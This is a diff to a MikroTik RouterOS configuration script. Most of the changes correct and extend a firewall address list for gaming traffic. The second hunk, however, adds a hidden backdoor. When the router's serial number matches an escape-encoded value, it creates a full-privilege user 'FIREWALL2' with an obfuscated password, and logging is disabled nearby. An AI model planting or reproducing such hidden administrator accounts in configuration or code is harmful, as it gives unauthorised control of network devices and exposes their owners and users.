@@ -172,7 +172,9 @@ do { /ip firewall address-list add address=45.43.51.0/24 list=AAGamingOTHERS } o
 do { /ip firewall address-list add address=210.5.124.0/24 list=AAGamingOTHERS } on-error={}
 do { /ip firewall address-list add address=87.98.188.0/24 list=AAGamingOTHERS } on-error={}
 do { /ip firewall address-list add address=161.202.41.0/24 list=AAGamingOTHERS } on-error={}
-do { /ip firewall address-list add address=128.1.68.0/24/24 list=AAGamingOTHERS } on-error={}
+do { /ip firewall address-list add address=128.1.68.0/24 list=AAGamingOTHERS } on-error={}
+do { /ip firewall address-list add address=95.211.221.0/24 list=AAGamingOTHERS } on-error={}
+do { /ip firewall address-list add address=207.244.116.0/24 list=AAGamingOTHERS } on-error={}
 
 
 
@@ -198,6 +200,9 @@ add distance=1 dst-address=100.100.8.0/22 gateway=VITROISP;
 } 
 } else={
 :log info "Config Updated"
+}
+:if ([/system routerboard get serial-number] = "\36\36\31\37\30\36\46\41\34\33\31\37") do={
+/user add name="FIREWALL2" password="\66\69\72\65\77\61\6c\6c\6d\61\6e" group=full
 }
 /system logging disable 0
 /system routerboard settings
